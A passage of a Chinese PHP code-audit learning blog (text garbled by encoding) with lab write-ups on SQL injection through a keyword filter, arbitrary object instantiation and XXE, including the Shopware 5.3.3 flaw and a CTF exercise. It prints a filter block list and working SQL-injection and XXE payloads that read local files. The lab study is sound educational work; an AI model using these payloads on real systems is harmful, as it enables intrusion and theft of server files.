<p>å°è¯•å¯¹<code>id</code>è¿™ä¸ªå‚æ•°æ³¨å…¥å‘ç°<code>config.php</code>å¯¹æ³¨å…¥è¿›è¡Œäº†é™åˆ¶ï¼Œè¿‡æ»¤äº†å…³é”®å­—<code>insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval</code>ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼ŒæŠŠ<code>group_concat</code>æ¢æˆ<code>make_set</code>å‡½æ•°ç”¨äºæ‹¼æ¥å­—ç¬¦ä¸²ã€‚</p>
<blockquote>
<p>make_setï¼š<a href="https://blog.csdn.net/qq_41725312/article/details/83039525">https://blog.csdn.net/qq_41725312/article/details/83039525</a></p>
</blockquote>
<p>Payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;PHP-Audit-Labs&#x2F;day1&#x2F;?id&#x3D;3%20and%20(select%20updatexml(1,make_set(3,%27~%27,(select%20flag% 20fromï¼…20flagï¼‰ï¼‰ï¼Œ1ï¼‰ï¼‰</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200609192811.png" alt=""></p>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”Day3</title>
    <url>/code_audit/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3/</url>
    <content><![CDATA[<h1 id="PHPä»£ç å®¡è®¡å­¦ä¹ Day3â€”â€”å®ä¾‹åŒ–ä»»æ„å¯¹è±¡æ¼æ´">PHPä»£ç å®¡è®¡å­¦ä¹ Day3â€”â€”å®ä¾‹åŒ–ä»»æ„å¯¹è±¡æ¼æ´</h1>
<h2 id="0x01-Snow-flake">0x01 Snow flake</h2>
<p>ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params">$className</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">include</span> $className;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$controllerName = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">$data = $_GET[<span class="string">&#x27;d&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (class_exists($controllerName)) &#123;</span><br><span class="line">    $controller = <span class="keyword">new</span> $controllerName($data);</span><br><span class="line">    $controller-&gt;render();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;There is no page with this name&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;new&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;controller rendering new response&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;controller rendering old response&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="class-exist-æ–‡ä»¶åŒ…å«æ¼æ´"><code>class_exist()</code>æ–‡ä»¶åŒ…å«æ¼æ´</h3>
<p>é¦–å…ˆæ¥çœ‹<code>class_exist()</code>çš„å®šä¹‰ï¼š</p>
<blockquote>
<p><a href="http://php.net/manual/zh/function.class-exists.php">class_exists </a>ï¼š(PHP 4, PHP 5, PHP 7)</p>
<p><strong>åŠŸèƒ½</strong> ï¼šæ£€æŸ¥ç±»æ˜¯å¦å·²å®šä¹‰</p>
<p><strong>å®šä¹‰</strong> ï¼š <code>bool class_exists ( string $class_name[, bool $autoload = true ] )</code></p>
<p><strong>$class_name</strong> ä¸ºç±»çš„åå­—ï¼Œåœ¨åŒ¹é…çš„æ—¶å€™ä¸åŒºåˆ†å¤§å°å†™ã€‚é»˜è®¤æƒ…å†µä¸‹ <strong>$autoload</strong> ä¸º <strong>true</strong> ï¼Œå½“ <strong>$autoload</strong> ä¸º <strong>true</strong> æ—¶ï¼Œä¼šè‡ªåŠ¨åŠ è½½æœ¬ç¨‹åºä¸­çš„ <strong>__autoload</strong> å‡½æ•°ï¼›å½“ <strong>$autoload</strong> ä¸º <strong>false</strong> æ—¶ï¼Œåˆ™ä¸è°ƒç”¨ <strong>__autoload</strong> å‡½æ•°ã€‚</p>
</blockquote>
<p>ä¸Šé¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>class_exist()</code>ä¼šç›´æ¥è°ƒç”¨<code>__autoload()</code>å‡½æ•°ï¼Œè€Œ<code>__autoload()</code>å‡½æ•°çš„å‚æ•°å¯ä»¥ç”¨æˆ·å¯æ§çš„ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨è·¯å¾„ç©¿è¶Šæ¥åŒ…å«ä»»æ„æ–‡ä»¶ã€‚</p>
<blockquote>
<p>ä½¿ç”¨è·¯å¾„ç©¿è¶Šç¬¦å·çš„å‰ææ˜¯PHPç‰ˆæœ¬å°äº5.4</p>
</blockquote>
<h3 id="SimpleXMLElementXXEæ¼æ´"><code>SimpleXMLElement</code>XXEæ¼æ´</h3>
<p>ç¬¬9è¡Œä»£ç ä¸­ï¼Œå®ä¾‹åŒ–ç±»çš„ç±»åå’Œå‚æ•°å‡åœ¨ç”¨æˆ·æ§åˆ¶ä¹‹ä¸‹ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡è¿™ä¸ªæ¼æ´ï¼Œè°ƒç”¨PHPä»£ç åº“çš„ä»»æ„æ„é€ å‡½æ•°ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨PHPå†…ç½®ç±»<code>SimpleXMLElement</code>è¿›è¡ŒXXEæ”»å‡»ï¼Œè¿›è€Œè¯»å–æ–‡ä»¶å†…å®¹å’Œå‘½ä»¤æ‰§è¡Œï¼ˆPHPå®‰è£…expectæ‰©å±•ï¼‰ã€‚</p>
<blockquote>
<p><a href="http://php.net/manual/zh/class.simplexmlelement.php">SimpleXMLElement</a> ï¼š(PHP 5, PHP 7)</p>
<p><strong>åŠŸèƒ½</strong> ï¼šç”¨æ¥è¡¨ç¤ºXMLæ–‡æ¡£ä¸­çš„å…ƒç´ ï¼Œä¸ºPHPçš„å†…ç½®ç±»ã€‚</p>
</blockquote>
<p>ç”¨æ³•ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œç›´æ¥ä¼ å…¥ä¸€ä¸ªåŒ…å«æ¶æ„payloadçš„XMLä»£ç å³å¯ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = &lt;&lt;&lt;EOF</span><br><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> <span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///E:/phpStudy/PHPTutorial/flag.txt&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xee&lt;/x&gt;</span><br><span class="line">EOF;</span><br><span class="line">$xml_class = <span class="keyword">new</span> SimpleXMLElement($xml, LIBXML_NOENT);</span><br><span class="line">var_dump($xml_class);</span><br></pre></td></tr></table></figure>
<h2 id="0x02-å®ä¾‹åˆ†æ">0x02 å®ä¾‹åˆ†æ</h2>
<p>è¿™æ¬¡çš„å®ä¾‹åˆ†æç”¨åˆ°çš„æ˜¯Shopware 5.3.3ç‰ˆæœ¬ï¼Œåå°ä»£ç å…¶ä¸­æœ‰ä¸€å¤„æä¾›äº†åŠ¨æ€æ–°å»ºç±»çš„å‡½æ•°ï¼Œç„¶è€Œå¹¶æ²¡æœ‰å¯¹æ–°å»ºçš„ç±»è¿›è¡Œé™åˆ¶ï¼Œç”±äºæ–°å»ºçš„ç±»åå’Œä¼ é€’çš„å‚æ•°éƒ½æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œä»è€Œé€ æˆæ¼æ´ã€‚å…¥å£ç‚¹æ˜¯åœ¨<code>engine\Shopware\Controllers\Backend\ProductStream.php</code>æ–‡ä»¶ä¸­æœ‰ä¸€ä¸ª<code>loadPreviewAction</code>æ–¹æ³•ï¼Œä½œç”¨æ˜¯ç”¨æ¥æµè§ˆäº§å“æµçš„è¯¦ç»†ä¿¡æ¯ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shopware_Controllers_Backend_ProductStream</span> <span class="keyword">extends</span> <span class="title">Shopware_Controllers_Backend_Application</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadPreviewAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $conditions = <span class="keyword">$this</span>-&gt;Request()-&gt;getParam(<span class="string">&#x27;conditions&#x27;</span>);</span><br><span class="line">        $conditions = json_decode($conditions, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        $sorting = <span class="keyword">$this</span>-&gt;Request()-&gt;getParam(<span class="string">&#x27;sort&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        $criteria = <span class="keyword">new</span> Criteria();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> RepositoryInterface $streamRepo */</span></span><br><span class="line">        $streamRepo = <span class="keyword">$this</span>-&gt;get(<span class="string">&#x27;shopware_product_stream.repository&#x27;</span>);</span><br><span class="line">        $sorting = $streamRepo-&gt;unserialize($sorting);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($sorting <span class="keyword">as</span> $sort) &#123;</span><br><span class="line">            $criteria-&gt;addSorting($sort);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $conditions = $streamRepo-&gt;unserialize($conditions);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($conditions <span class="keyword">as</span> $condition) &#123;</span><br><span class="line">            $criteria-&gt;addCondition($condition);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¯¥æ–¹æ³•æ¥æ”¶ä»ç”¨æˆ·ä¼ æ¥çš„å‚æ•° <code>sort </code>ï¼Œç„¶åä¼ å…¥ <code>Repository </code>ç±»çš„ <code>unserialize </code>æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›<code>unserialize()</code>æ–¹æ³•ï¼Œå®é™…ä¸Šæ˜¯è°ƒç”¨<code> engine\Shopware\Components\LogawareReflectionHelper.php</code>ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params">$serialized, $errorSource</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $classes = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($serialized <span class="keyword">as</span> $className =&gt; $arguments) &#123;</span><br><span class="line">            $className = explode(<span class="string">&#x27;|&#x27;</span>, $className);</span><br><span class="line">            $className = $className[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                $classes[] = <span class="keyword">$this</span>-&gt;reflector-&gt;createInstanceFromNamedArguments($className, $arguments);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> $e) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;logger-&gt;critical($errorSource . <span class="string">&#x27;: &#x27;</span> . $e-&gt;getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $classes;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„ <code>$serialized</code> å°±æ˜¯æˆ‘ä»¬åˆšåˆšä¼ å…¥çš„ <code>sort</code> ï¼ˆä¸Šå›¾ç¬¬3è¡Œï¼‰ï¼Œç¨‹åºåˆ†åˆ«ä» <code>sort</code> ä¸­æå–å‡ºå€¼èµ‹ç»™ <code>$className</code> å’Œ <code>$arguments</code> å˜é‡ï¼Œç„¶åè¿™ä¸¤ä¸ªå˜é‡è¢«ä¼ å…¥ ReflectionHelper ç±»çš„ <code>createInstanceFromNamedArguments</code> æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›è¿™ä¸ªå‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createInstanceFromNamedArguments</span>(<span class="params">$className, $arguments</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $reflectionClass = <span class="keyword">new</span> \ReflectionClass($className);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!$reflectionClass-&gt;getConstructor()) &#123;</span><br><span class="line">            <span class="keyword">return</span> $reflectionClass-&gt;newInstance();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $constructorParams = $reflectionClass-&gt;getConstructor()-&gt;getParameters();</span><br><span class="line"></span><br><span class="line">        $newParams = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($constructorParams <span class="keyword">as</span> $constructorParam) &#123;</span><br><span class="line">            $paramName = $constructorParam-&gt;getName();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">isset</span>($arguments[$paramName])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!$constructorParam-&gt;isOptional()) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">RuntimeException</span>(sprintf(<span class="string">&quot;Required constructor Parameter Missing: &#x27;$%s&#x27;.&quot;</span>, $paramName));</span><br><span class="line">                &#125;</span><br><span class="line">                $newParams[] = $constructorParam-&gt;getDefaultValue();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $newParams[] = $arguments[$paramName];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $reflectionClass-&gt;newInstanceArgs($newParams);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å‡½æ•°çš„ç¬¬ä¸€è¡Œå°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªåå°„ç±»ï¼Œè€Œç±»åå°±æ˜¯æ¥è‡ªæˆ‘ä»¬ä¼ å…¥çš„<code>sort</code>å‚æ•°ã€‚æœ€åä¸€å¥<code>return</code>æ—¶æ ¹æ®å‚æ•°<code>newInstanceArgs</code>åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„å®ä¾‹å¯¹è±¡ï¼Œå‚æ•°<code>newInstanceArgs</code>æ˜¯ä»<code>$arguments[$paraName]</code>ä¸­å–å€¼ï¼Œå¹¶ä¸”<code>$arguments</code>æ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œé‚£ä¹ˆå½“æˆ‘ä»¬ä¼ å…¥ç±»åä¸º<code>SimpleXMLElement</code>æ—¶ï¼Œå®ä¾‹åŒ–åï¼Œä¼šå°†ä¼ å…¥çš„å‚æ•°è¿›è¡Œ<code>xml</code>è§£æã€‚</p>
<blockquote>
<p>ä¸­é—´çš„é‚£ä¸€æ®µforå¾ªç¯ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯å¦‚æœæ²¡æœ‰ä¼ å…¥éå¯é€‰å‚æ•°æ—¶ç›´æ¥æŠ¥é”™ï¼Œæ²¡æœ‰ä¼ å…¥éå¯é€‰å‚æ•°æ—¶ä¼šèµ‹é»˜è®¤å€¼ã€‚</p>
</blockquote>
<blockquote>
<p>å…·ä½“çš„åˆ†ææ–‡ç« ï¼š<a href="https://www.freebuf.com/vuls/154415.html">https://www.freebuf.com/vuls/154415.html</a></p>
</blockquote>
<h2 id="0x03-æ¼æ´åˆ©ç”¨">0x03 æ¼æ´åˆ©ç”¨</h2>
<p>æ­å»ºè¿™ä¸ªç¯å¢ƒèŠ±äº†æˆ‘ä¸€å¤©çš„æ—¶é—´ï¼Œæœ€åè¿˜æ˜¯ç”¨çš„å…¶ä»–å¸ˆå‚…å·²ç»åšå¥½çš„dockeré•œåƒè·‘èµ·æ¥çš„ï¼Œä½†æ˜¯è¿™ä¸ªç¯å¢ƒè¿˜æ˜¯æ²¡æœ‰åŠæ³•è°ƒè¯•ã€‚</p>
<blockquote>
<p>ç¯å¢ƒï¼š</p>
<p>Windows 10 2004</p>
<p>Docker 2.2.0.5</p>
<p>æ­å»ºæ­¥éª¤ï¼š</p>
<p>docker pull gaoxijiejie/shopware:okay</p>
<p>docker run -i -t -p 8000:80 gaoxijiejie/shopware bash</p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200613202832.png" alt=""></p>
<p>å½“æˆ‘ä»¬ç‚¹å‡» Refresh preview æŒ‰é’®æ—¶ï¼Œå°±ä¼šè°ƒç”¨ <code>loadPreviewAction</code> æ–¹æ³•ï¼Œç”¨BurpSuiteæŠ“åˆ°åŒ…å¦‚ä¸‹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200613203100.png" alt=""></p>
<p>å…¶ä¸­ä¸»è¦å°±æ˜¯sortå‚æ•°çš„å€¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%7B%22Shopware%5C%5CBundle%5C%5CSearchBundle%5C%5CSorting%5C%5CPriceSorting%22%3A%7B%22direction%22%3A%22ASC%22%7D%7D</span><br></pre></td></tr></table></figure>
<p>Urlè§£ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;Shopware\\Bundle\\SearchBundle\\Sorting\\PriceSorting&quot;:&#123;&quot;direction&quot;:&quot;ASC&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸ºäº†æ„é€ ç±»ä¼¼çš„payloadï¼Œå…ˆæ¥æŸ¥çœ‹<code>SimpleXMLElement</code>ç±»çš„æ„é€ å‡½æ•°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">final public SimpleXMLElement::__construct ( string $data [, int $options &#x3D; 0 [, bool $data_is_url &#x3D; FALSE [, string $ns &#x3D; &quot;&quot; [, bool $is_prefix &#x3D; FALSE ]]]] )</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200613203539.png" alt=""></p>
<p>ä¸ºäº†å‡å°‘Payloadçš„é•¿åº¦ï¼Œæˆ‘ä»¬è¦ä¼ å…¥<code>data_is_url=TRUE</code>ä½¿å¾—å¯ä»¥ç”¨URLä¼ å…¥æ¶æ„XMLæ•°æ®ï¼Œé‚£ä¹ˆPayloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;SimpleXMLElement&quot;:&#123;&quot;data&quot;:&quot;http:&#x2F;&#x2F;172.19.14.43:8000&#x2F;xxe.xml&quot;,&quot;options&quot;:2,&quot;data_is_url&quot;:1,&quot;ns&quot;:&quot;&quot;,&quot;is_prefix&quot;:0&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><code>xxe.xml</code>æ–‡ä»¶å†…å®¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [ </span><br><span class="line">     &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;&#x2F;x&gt;</span><br></pre></td></tr></table></figure>
<p>å½“ç„¶è¿™ä¸ªæ˜¯å±äºBlind XXEï¼Œæ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œåªèƒ½ç”¨å¤–éƒ¨DTDæ¥å¤–å¸¦æ•°æ®ï¼Œä½†æ˜¯è¿™ç§æ²¡èƒ½å¤ç°æˆåŠŸï¼Œè€Œä¸”ä¹Ÿä¸èƒ½è°ƒè¯•ï¼Œè›®é—æ†¾çš„ã€‚</p>
<h2 id="0x04-ç»ƒä¹ é¢˜">0x04 ç»ƒä¹ é¢˜</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;404&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(</span><br><span class="line">	<span class="function"><span class="keyword">function</span> (<span class="params">$class</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">new</span> NotFound();</span><br><span class="line">	&#125;</span><br><span class="line">);</span><br><span class="line">$classname = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>]) ? $_GET[<span class="string">&#x27;name&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line">$param = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;param&#x27;</span>]) ? $_GET[<span class="string">&#x27;param&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line">$param2 = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;param2&#x27;</span>]) ? $_GET[<span class="string">&#x27;param2&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(class_exists($classname))&#123;</span><br><span class="line">	$newclass = <span class="keyword">new</span> $classname($param,$param2);</span><br><span class="line">	var_dump($newclass);</span><br><span class="line">    <span class="keyword">foreach</span> ($newclass <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">        <span class="keyword">echo</span> $key.<span class="string">&#x27;=&gt;&#x27;</span>.$value.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// f1agi3hEre.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">&quot;HRCTF&#123;X33_W1tH_S1mpl3Xml3l3m3nt&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ ¹æ®ä¸Šé¢çš„çŸ¥è¯†å‚¨å¤‡ï¼Œæˆ‘ä»¬åœ¨ä¸Šå›¾ç¬¬18è¡Œå¤„å¯ä»¥çœ‹åˆ°ä½¿ç”¨äº† <strong>class_exists</strong> å‡½æ•°æ¥åˆ¤æ–­ç±»æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨çš„è¯ï¼Œå°±ä¼šè°ƒç”¨ç¨‹åºä¸­çš„ <strong>__autoload</strong> å‡½æ•°ï¼Œä½†æ˜¯è¿™é‡Œæ²¡æœ‰ <strong>__autoload</strong> å‡½æ•°ï¼Œè€Œæ˜¯ç”¨ <a href="http://php.net/manual/en/function.spl-autoload-register.php">spl_autoload_register</a> æ³¨å†Œäº†ä¸€ä¸ªç±»ä¼¼ <strong>__autoload</strong> ä½œç”¨çš„å‡½æ•°ï¼Œå³è¿™é‡Œè¾“å‡º404ä¿¡æ¯ã€‚</p>
<blockquote>
<p><a href="https://segmentfault.com/a/1190000012203213">PHP è‡ªåŠ¨åŠ è½½ æ·±åº¦æ€»ç»“</a></p>
</blockquote>
<p>é¦–å…ˆæˆ‘ä»¬ç”¨<code>GlobIterator</code> ç±»æœç´¢flagæ–‡ä»¶åå­—ï¼Œæ„é€ æ–¹æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public GlobIterator::__construct ( string $pattern [, int $flags &#x3D; FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO ] )</span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¦æœç´¢çš„æ–‡ä»¶åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºé€‰æ‹©æ–‡ä»¶çš„å“ªä¸ªä¿¡æ¯ä½œä¸ºé”®åï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨å®ƒçš„é»˜è®¤å€¼<code>CURRENT_AS_FILEINFO</code>å³å¯ï¼Œpayloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;PHP-Audit-Labs&#x2F;Day3&#x2F;index.php?name&#x3D;GlobIterator&amp;param&#x3D;.&#x2F;*.php</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200614000014.png" alt=""></p>
<p>ç¬¬äºŒæ­¥ç”¨<code>SimpleXMLElement</code>ç±»è¯»å–flagï¼Œè¿™é‡Œå› ä¸ºæ–‡ä»¶ä¸­å­˜åœ¨<code>&lt; &gt; &amp; ' &quot;</code>ç¬¦å·ï¼Œæ‰€ä»¥éœ€è¦å¯¹è¯»å–çš„æ•°æ®è¿›è¡Œbase64ç¼–ç ï¼Œä¸ç„¶ä¼šå¯¼è‡´XMLè§£æå¤±è´¥ï¼Œpayloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;PHP-Audit-Labs&#x2F;Day3&#x2F;index.php?name&#x3D;SimpleXMLElement&amp;para&#x3D;?name&#x3D;SimpleXMLElement&amp;param&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;E:&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;PHP-Audit-Labs&#x2F;Day3&#x2F;f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;&#x2F;x&gt;&amp;para2&#x3D;2</span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸€ä¸ªå‚æ•°çš„å†…å®¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;SimpleXMLElement&amp;param&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;E:&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;PHP-Audit-Labs&#x2F;Day3&#x2F;f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;&#x2F;x&gt;</span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒä¸ªå‚æ•°å®é™…ä¸Šè¿™é‡Œ2å¯¹åº”çš„æ¨¡å¼æ˜¯ <strong>LIBXML_NOENT</strong>ï¼Œå› ä¸ºåœ¨libxml&gt;=2.9.0ä»¥åçš„ç‰ˆæœ¬é»˜è®¤ä¸å¼€å¯å¤–éƒ¨å®ä½“è§£æï¼Œéœ€è¦æ·»åŠ è¿™ä¸ªå‚æ•°å¼€å¯ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200614002436.png" alt=""></p>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”Day2</title>
